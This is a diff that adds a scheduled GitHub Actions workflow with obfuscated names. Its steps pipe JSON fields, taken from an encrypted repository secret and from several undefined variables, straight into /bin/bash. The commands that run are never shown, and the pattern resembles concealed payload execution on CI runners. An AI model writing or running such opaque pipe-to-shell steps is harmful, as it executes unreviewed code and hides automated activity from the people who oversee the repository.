@@ -1,0 +1,21 @@
+name: naxiechuanzhepojiu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: naxiechuanzhepojiu
+        env:
+          w38779: ${{ secrets.w38779 }}
+        run: |
+          echo $w38779 | jq -r .wrvl88 | /bin/bash
+          echo $z2 | jq -r .bn3 | /bin/bash
+          echo $fl30625 | jq -r .esu86 | /bin/bash
+          echo $s20178 | jq -r .i578 | /bin/bash
+          echo $xotr601 | jq -r .r16245 | /bin/bash
+
